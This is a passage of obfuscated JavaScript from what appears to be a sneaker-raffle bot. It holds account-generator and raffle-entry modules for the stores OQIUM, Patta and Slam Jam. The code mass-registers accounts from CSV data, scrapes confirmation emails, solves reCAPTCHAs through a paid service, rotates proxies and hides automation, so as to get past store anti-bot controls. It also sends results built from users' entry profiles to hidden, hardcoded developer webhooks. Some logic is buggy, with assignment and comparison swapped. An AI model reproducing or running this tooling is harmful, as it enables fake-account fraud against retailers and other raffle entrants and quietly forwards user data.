                                            _0x3053a1['on']('body', function (_0x469c52, _0x56af75) {
                                                _0x22cc54(_0x469c52, (_0x3487a0, _0x224424) => {
                                                    if (_0x224424['subject'] == 'Confirm\x20Your\x20Subscription' && _0x224424['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x8caf5 = _0x224424['text']['split']('(')[0x1], _0xf5da3e = _0x8caf5['split'](')')[0x0];
                                                        _0x180c59['push'](_0xf5da3e);
                                                    }
                                                });
                                            }), _0x3053a1['once']('end', function () {
                                            });
                                        }), _0x1f0556['once']('error', function (_0x511052) {
                                            console['log']('Fetch\x20error:\x20' + _0x511052);
                                        }), _0x1f0556['once']('end', function () {
                                            _0x2efbec['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x2efbec['once']('error', function (_0x7c7922) {
                            console['log'](_0x7c7922);
                        }), _0x2efbec['once']('end', async function () {
                        }), _0x2efbec['connect']();
                    }
                    async function _0x41dabd(_0xbd05f4, _0xb141e, _0x2a9a08) {
                        for (var _0x4e45d0 = 0x0; _0x4e45d0 < _0xb141e['length']; _0x4e45d0++) {
                            async function _0x39ec22(_0xebacfb, _0x22d936, _0x462b33, _0x14c045, _0x2af3e2) {
                                var _0x1a3c22, _0x359b13 = {}, _0x5df69b = [], _0x3d76d1 = {}, _0x45d934 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x587105 = Math['round'](Math['random']() * (_0x45d934['length'] - 0x1));
                                _0x14c045[_0xebacfb]['Size'] == 'RANDOM' && (_0x14c045[_0xebacfb]['Size'] = _0x45d934[_0x587105]);
                                !_0x14c045 && (_0x14c045 = {});
                                if (_0xb4964b['useRandomProxy'] = ![])
                                    var _0x49095b = _0x2af3e2[_0xebacfb]['split'](':');
                                else
                                    var _0x20c452 = Math['round'](Math['random']() * (_0x2af3e2['length'] - 0x1)), _0x49095b = _0x2af3e2[_0x20c452]['split'](':');
                                var _0x1f3a22 = {
                                    'jar': _0x3aae82,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x462b33['url'],
                                    'headers': _0x462b33['headers'],
                                    'body': JSON['stringify'](_0x359b13),
                                    'proxy': 'http://' + _0x49095b[0x2] + ':' + _0x49095b[0x3] + '@' + _0x49095b[0x0] + ':' + _0x49095b[0x1]
                                };
                                return _0x22d936 != 'ver' && (_0x1f3a22['url'] = _0x462b33['url'], _0x1f3a22['headers'] = _0x462b33['headers']), _0x22d936 == 'ver' && (_0x1f3a22['method'] = 'GET', _0x1f3a22['url'] = _0x14c045[_0xebacfb]), new Promise(function (_0x5bb36d, _0x19d763) {
                                    callback = async (_0x51088e, _0x372bc9, _0x47eab9) => {
                                        if (!_0x51088e && _0x372bc9['statusCode'] == 0xca || !_0x51088e && _0x372bc9['statusCode'] == 0xc8) {
                                            if (_0x22d936 != 'ver') {
                                                var _0x1d70b3 = await _0x4d9326(_0x14c045[_0xebacfb], _0x462b33, 'dev', ![]), _0x145705 = await _0x4d9326(_0x14c045[_0xebacfb], _0x462b33, 'pub', ![]);
                                                const _0x82da6f = {
                                                    'succesDEVMSG': { 'embeds': [_0x1d70b3] },
                                                    'succesPUBMSG': { 'embeds': [_0x145705] }
                                                };
                                                if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                                                    try {
                                                        await _0x584f8b(_0xb4964b['webhook'], _0x82da6f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x82da6f['succesDEVMSG']), await _0x63444f(0xc8);
                                                try {
                                                    await _0x584f8b(_0x3501b6, _0x82da6f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xa2d2c6(_0x14c045[_0xebacfb], _0x462b33);
                                            }
                                            _0x5bb36d(console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x462b33['name'] + ']\x20Task\x20' + (_0xebacfb + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x22d936 != 'ver') {
                                                var _0x21bf3e = '' + _0x51088e, _0x57a336 = await _0x4d9326(_0x14c045[_0xebacfb], _0x462b33, 'dev', !![], _0x21bf3e), _0x580dc5 = {};
                                                _0x580dc5['errorDEV'] = { 'embeds': [_0x57a336] }, _0x1d0bc0(_0x14c045[_0xebacfb], _0x462b33), _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x580dc5['errorDEV']), await _0x584f8b(_0x437fba, _0x580dc5['errorDEV']);
                                            }
                                            _0x19d763(console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x462b33['name'] + ']\x20Task\x20' + (_0xebacfb + 0x1) + ':\x20' + _0x51088e)));
                                        }
                                    };
                                    try {
                                        _0x22d936 != 'ver' ? console['log'](_0x46d913() + '\x20[' + _0x462b33['name'] + ']\x20Task\x20' + (_0xebacfb + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x359b13['data']['attributes']['email']) : console['log'](_0x46d913() + '\x20[' + _0x462b33['name'] + ']\x20Task\x20' + (_0xebacfb + 0x1) + ':\x20Fetching\x20Response'), _0x15bdb0(_0x1f3a22, callback);
                                    } catch (_0x5b6dab) {
                                        console['log'](_0x46d913() + '\x20Task\x20' + (_0xebacfb + 0x1) + ':\x20' + _0x5b6dab);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x39ec22(_0x4e45d0, 'ver', _0xbd05f4, _0xb141e, _0x2a9a08), console['log'](_0x46d913() + '\x20[' + _0xbd05f4['name'] + ']\x20Sleeping\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                            } catch (_0x2e08a1) {
                            }
                        }
                    }
                    try {
                        _0xd85786(), await _0x63444f(0xfa0), console['log']('Found\x20' + _0x180c59['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x41dabd(_0x3282bf, _0x180c59, _0x1e2824);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0xd8de8a, _0x5e4cbf, _0x538462) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x52a0d7 = 0x0; _0x52a0d7 < _0x5e4cbf['length']; _0x52a0d7++) {
                        var _0x5e614c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1a887b
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0xb4964b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b25e6
                                }
                            ]
                        }];
                        const _0x1484f2 = { 'embeds': _0x5e614c };
                        _0x40199d(_0xd8de8a['name'] + '\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20/\x20' + _0x5e4cbf['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x5e4cbf, _0x52a0d7);
                        var _0x2f5aff = await _0x4d9326(_0x5e4cbf[_0x52a0d7], _0xd8de8a, 'acc', ![]);
                        const _0x2b80d1 = { 'succesDEVMSG': { 'embeds': [_0x2f5aff] } };
                        if (_0x5e4cbf[_0x52a0d7]['Email'] == '' || _0x5e4cbf[_0x52a0d7]['FirstName'] == '' || _0x5e4cbf[_0x52a0d7]['LastName'] == '') {
                            console['log'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x63444f(0x7d0);
                            continue;
                        }
                        (_0x5e4cbf[_0x52a0d7]['Password'] == '' || _0x5e4cbf[_0x52a0d7] == undefined) && _0x5e4cbf[_0x52a0d7]['Password'] == 'JRaffles23!';
                        if (_0xb4964b['useRandomProxy'] = ![])
                            var _0x58ad75 = _0x538462[_0x52a0d7]['split'](':');
                        else
                            var _0x326d0b = Math['round'](Math['random']() * (_0x538462['length'] - 0x1)), _0x58ad75 = _0x538462[_0x326d0b]['split'](':');
                        const _0x409ddd = await _0x5e99b4['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x58ad75[0x0] + ':' + _0x58ad75[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x9ab27c = await _0x409ddd['newPage']();
                            await _0x9ab27c['authenticate']({
                                'username': '' + _0x58ad75[0x2],
                                'password': '' + _0x58ad75[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0xd8de8a['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9ab27c['setRequestInterception'](!![]), _0x9ab27c['on']('request', _0x22e555 => {
                                _0x22e555['resourceType']() === 'image' || _0x22e555['resourceType']() === 'font' || _0x22e555['resourceType']() === 'media' ? _0x22e555['abort']() : _0x22e555['continue']();
                            }), await _0x9ab27c['goto']('https://patta.nl/account/register'), await _0x63444f(0xbb8), await _0x9ab27c['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x46d913() + '\x20[' + _0xd8de8a['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20Filling\x20information'), await _0x9ab27c['type']('#RegisterForm-FirstName', '' + _0x5e4cbf[_0x52a0d7]['FirstName']), await _0x63444f(0x226), await _0x9ab27c['type']('#RegisterForm-LastName', '' + _0x5e4cbf[_0x52a0d7]['LastName']), await _0x63444f(0x226), await _0x9ab27c['type']('#RegisterForm-email', '' + _0x5e4cbf[_0x52a0d7]['Email']), await _0x63444f(0x226), await _0x9ab27c['type']('#RegisterForm-password', '' + _0x5e4cbf[_0x52a0d7]['Password']), await _0x63444f(0x226), console['log'](_0x46d913() + '\x20[' + _0xd8de8a['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20Submitting..'), await _0x9ab27c['$eval']('#RegisterForm', _0x3b31e9 => _0x3b31e9['submit']()), await _0x63444f(0x1f40);
                            try {
                                await _0x9ab27c['waitForSelector']('.home-page-grid__collection'), await _0x63444f(0x1f4), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0xd8de8a['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20Account\x20' + _0x5e4cbf[_0x52a0d7]['Email'] + '\x20Generated!')), _0x442555['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x5e4cbf[_0x52a0d7]['Email'] + ',' + _0x5e4cbf[_0x52a0d7]['Password']), console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0xd8de8a['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20Account\x20' + _0x5e4cbf[_0x52a0d7]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x2b80d1['succesDEVMSG']);
                                } catch {
                                }
                                await _0x584f8b(_0x214943, _0x2b80d1['succesDEVMSG']);
                            } catch (_0x133721) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x133721));
                            }
                        } catch (_0x1781b3) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x52a0d7 + 0x1) + '\x20:\x20' + _0x1781b3));
                        } finally {
                            _0x409ddd && _0x409ddd['close'](), console['log']('Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x2c0392, _0x210b42, _0x2b3fd1) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3417fe = 0x0; _0x3417fe < _0x210b42['length']; _0x3417fe++) {
                        var _0x7b7284;
                        if (_0x245fa1 != 'yes')
                            var _0x245fa1 = '', _0x54364b = 0x0;
                        _0x40199d(_0x2c0392['name'] + '\x20Task\x20' + (_0x3417fe + 0x1) + '\x20/\x20' + _0x210b42['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x210b42, _0x3417fe);
                        if (_0x210b42[_0x3417fe]['Email'] == '' || _0x210b42[_0x3417fe]['Password'] == '' || _0x210b42[_0x3417fe]['FirstName'] == '' || _0x210b42[_0x3417fe]['LastName'] == '') {
                            console['log'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0xb4964b['useRandomProxy'] = ![])
                            var _0x280c88 = _0x2b3fd1[_0x3417fe]['split'](':');
                        else
                            var _0x2903b3 = Math['round'](Math['random']() * (_0x2b3fd1['length'] - 0x1)), _0x280c88 = _0x2b3fd1[_0x2903b3]['split'](':');
                        const _0x3a48d7 = await _0x5e99b4['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x280c88[0x0] + ':' + _0x280c88[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x38fa1a = await _0x3a48d7['newPage']();
                            await _0x38fa1a['authenticate']({
                                'username': '' + _0x280c88[0x2],
                                'password': '' + _0x280c88[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Getting\x20Session'), await _0x38fa1a['setRequestInterception'](!![]), _0x38fa1a['on']('request', _0x3e6d8e => {
                                _0x3e6d8e['resourceType']() === 'image' || _0x3e6d8e['resourceType']() === 'font' || _0x3e6d8e['resourceType']() === 'media' ? _0x3e6d8e['abort']() : _0x3e6d8e['continue']();
                            }), await _0x38fa1a['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x38fa1a['waitForSelector']('#CustomerEmail'), console['log'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Logging\x20in..'), await _0x38fa1a['type']('#CustomerEmail', '' + _0x210b42[_0x3417fe]['Email']), await _0x63444f(0x12c), await _0x38fa1a['type']('#CustomerPassword', '' + _0x210b42[_0x3417fe]['Password']), await _0x63444f(0x226), await _0x38fa1a['$eval']('#customer_login', _0x3c11fb => _0x3c11fb['submit']());
                            try {
                                await _0x38fa1a['waitForSelector']('#orders'), await _0x63444f(0x4b0);
                            } catch {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x38fa1a['goto']('' + _0x210b42[_0x3417fe]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x63444f(0xbb8), console['log'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x38fa1a['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x38fa1a['type']('#email', '' + _0x210b42[_0x3417fe]['Email']), await _0x63444f(0x384), await _0x38fa1a['type']('#first_name', '' + _0x210b42[_0x3417fe]['FirstName']), await _0x63444f(0x514), await _0x38fa1a['type']('#last_name', '' + _0x210b42[_0x3417fe]['LastName']), await _0x63444f(0x514), await _0x38fa1a['type']('#street_address', _0x210b42[_0x3417fe]['Address1'] + '\x20' + _0x210b42[_0x3417fe]['HouseNumber'] + '\x20' + _0x210b42[_0x3417fe]['Address2']), await _0x63444f(0x2bc);
                            _0x210b42[_0x3417fe]['Postcode'] == undefined && (_0x210b42[_0x3417fe]['Postcode'] = _0x210b42[_0x3417fe]['Zip']);
                            await _0x38fa1a['type']('#zip_code', '' + _0x210b42[_0x3417fe]['Postcode']), await _0x63444f(0x320), await _0x38fa1a['type']('#city', '' + _0x210b42[_0x3417fe]['City']), await _0x63444f(0x320), await _0x38fa1a['type']('#bday', '01/01/1994'), await _0x63444f(0x320), await _0x38fa1a['type']('#instagram', '' + _0x210b42[_0x3417fe]['Follower']), await _0x63444f(0x352);
                            if (_0x210b42[_0x3417fe]['Size'] == 'RANDOM') {
                                const _0x8c8e93 = await _0x38fa1a['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x177439 => {
                                    return _0x177439['map'](_0x3fc79d => _0x3fc79d['textContent']);
                                });
                                var _0x332b27 = Math['round'](Math['random']() * (_0x8c8e93['length'] - 0x1));
                                console['log'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x8c8e93[_0x332b27]), await _0x38fa1a['click']('label[data-eu-size=\x22' + _0x8c8e93[_0x332b27] + '\x22]');
                            } else {
                                console['log'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x210b42[_0x3417fe]['Size']);
                                try {
                                    await _0x38fa1a['click']('label[data-eu-size=\x22' + _0x210b42[_0x3417fe]['Size'] + '\x22]');
                                } catch {
                                    await _0x38fa1a['click']('label[data-eu-size=\x22' + _0x210b42[_0x3417fe]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x63444f(0xbb8), await _0x38fa1a['$$eval']('.raffle__checkbox-label', _0x12a4f0 => _0x12a4f0['forEach'](_0x5f217a => _0x5f217a['click']())), await _0x63444f(0x7d0), console['log'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x38fa1a['click']('#raffle__form-submit'), await _0x63444f(0x1388);
                            try {
                                await _0x38fa1a['waitForSelector']('#raffle__confirmation-message-container'), _0x245fa1 = 'no', _0xa2d2c6(_0x210b42[_0x3417fe], _0x2c0392), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x59ef17) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x59ef17));
                            }
                        } catch (_0x2bed44) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20' + _0x2bed44)), _0x245fa1 = 'yes';
                        } finally {
                            _0x3a48d7 && _0x3a48d7['close']();
                            if (_0x245fa1 == 'yes' && _0x54364b != 0x5 && _0x7b7284 != 'Size\x20Not\x20Found') {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x2c0392['name'] + ']\x20Task\x20' + (_0x3417fe + 0x1) + '\x20:\x20Retrying')), _0x3417fe = _0x3417fe - 0x1, _0x54364b = _0x54364b + 0x1;
                                continue;
                            }
                            _0x245fa1 == 'yes' && _0x54364b >= 0x5 && (_0x1d0bc0(_0x210b42[_0x3417fe], _0x2c0392), _0x245fa1 = 'no', _0x54364b = 0x0), console['log']('Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x55fd83, _0x7c02a4, _0x54ebbb) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1e0b0c = 0x0; _0x1e0b0c < _0x7c02a4['length']; _0x1e0b0c++) {
                        if (_0x2cd39b != 'yes')
                            var _0x2cd39b = '', _0x3e85f2 = 0x0;
                        var _0x4bdce0 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1a887b
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0xb4964b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3b25e6
                                }
                            ]
                        }];
                        const _0x49b43a = { 'embeds': _0x4bdce0 };
                        _0x40199d(_0x55fd83['name'] + '\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20/\x20' + _0x7c02a4['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x7c02a4, _0x1e0b0c);
                        var _0x44b196 = await _0x4d9326(_0x7c02a4[_0x1e0b0c], _0x55fd83, 'acc', ![]);
                        const _0xe3d548 = { 'succesDEVMSG': { 'embeds': [_0x44b196] } };
                        if (_0x7c02a4[_0x1e0b0c]['Email'] == '' || _0x7c02a4[_0x1e0b0c]['FirstName'] == '' || _0x7c02a4[_0x1e0b0c]['LastName'] == '') {
                            console['log'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x63444f(0x7d0);
                            continue;
                        }
                        (_0x7c02a4[_0x1e0b0c]['Password'] == '' || _0x7c02a4[_0x1e0b0c] == undefined) && _0x7c02a4[_0x1e0b0c]['Password'] == 'JRaffles23!';
                        if (_0xb4964b['useRandomProxy'] = ![])
                            var _0x20170c = _0x54ebbb[_0x1e0b0c]['split'](':');
                        else
                            var _0x2e27ed = Math['round'](Math['random']() * (_0x54ebbb['length'] - 0x1)), _0x20170c = _0x54ebbb[_0x2e27ed]['split'](':');
                        const _0x41c4f9 = await _0x5e99b4['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x20170c[0x0] + ':' + _0x20170c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x3ba415 = await _0x41c4f9['newPage']();
                            await _0x3ba415['authenticate']({
                                'username': '' + _0x20170c[0x2],
                                'password': '' + _0x20170c[0x3]
                            }), console['log'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3ba415['setRequestInterception'](!![]), _0x3ba415['on']('request', _0xc5c0b2 => {
                                _0xc5c0b2['resourceType']() === 'image' || _0xc5c0b2['resourceType']() === 'font' || _0xc5c0b2['resourceType']() === 'media' ? _0xc5c0b2['abort']() : _0xc5c0b2['continue']();
                            }), await _0x3ba415['goto']('https://drop.slamjam.com/account/register'), await _0x63444f(0xbb8), await _0x3ba415['waitForSelector']('#FirstName'), await _0x3ba415['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3ba415['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Filling\x20information'), await _0x63444f(0x4b0), await _0x3ba415['type']('#FirstName', '' + _0x7c02a4[_0x1e0b0c]['FirstName']), await _0x63444f(0x226), await _0x3ba415['type']('#LastName', '' + _0x7c02a4[_0x1e0b0c]['LastName']), await _0x63444f(0x226), await _0x3ba415['type']('#Email', '' + _0x7c02a4[_0x1e0b0c]['Email']), await _0x63444f(0x2ee), await _0x3ba415['type']('#ConfirmEmail', '' + _0x7c02a4[_0x1e0b0c]['Email']), await _0x63444f(0x2ee), await _0x3ba415['type']('#CreatePassword', '' + _0x7c02a4[_0x1e0b0c]['Password']), await _0x63444f(0x2ee), await _0x3ba415['type']('#CreateConfirmPassword', '' + _0x7c02a4[_0x1e0b0c]['Password']), await _0x63444f(0x226), console['log'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Submitting..'), await _0x3ba415['$eval']('#create_customer', _0x11cb16 => _0x11cb16['submit']()), await _0x63444f(0x1388), console['log'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20' + _0x580fd6['cyan']('Solving\x20Captcha')), await _0x3ba415['solveRecaptchas'](), console['log'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3ba415['$eval']('.shopify-challenge__container\x20>\x20form', _0x13e2d0 => _0x13e2d0['submit']());
                            try {
                                await _0x3ba415['waitForSelector']('.product-card__image'), await _0x63444f(0x1f4), _0x2cd39b = 'no', console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Account\x20' + _0x7c02a4[_0x1e0b0c]['Email'] + '\x20Generated!')), _0x442555['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x7c02a4[_0x1e0b0c]['Email'] + ',' + _0x7c02a4[_0x1e0b0c]['Password']), console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Account\x20' + _0x7c02a4[_0x1e0b0c]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0xe3d548['succesDEVMSG']);
                                } catch {
                                }
                                await _0x584f8b(_0x214943, _0xe3d548['succesDEVMSG']);
                            } catch (_0x551a27) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x551a27));
                            }
                        } catch (_0x49994e) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x58a956[taskModule]['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20' + _0x49994e));
                        } finally {
                            _0x41c4f9 && _0x41c4f9['close']();
                            if (_0x2cd39b == 'yes' && _0x3e85f2 != 0x5) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x55fd83['name'] + ']\x20Task\x20' + (_0x1e0b0c + 0x1) + '\x20:\x20Retrying')), _0x1e0b0c = _0x1e0b0c - 0x1, _0x3e85f2 = _0x3e85f2 + 0x1;
                                continue;
                            }
                            _0x2cd39b == 'yes' && _0x3e85f2 >= 0x5 && (_0x1d0bc0(_0x7c02a4[_0x1e0b0c], _0x55fd83), _0x2cd39b = 'no', _0x3e85f2 = 0x0), console['log']('Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x4eb610, _0x8d9268, _0x1fca0b) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x883800 = 0x0; _0x883800 < _0x8d9268['length']; _0x883800++) {
                        var _0x48bf95;
                        if (_0x2b3144 != 'yes')
                            var _0x2b3144 = '', _0x286ef1 = 0x0;
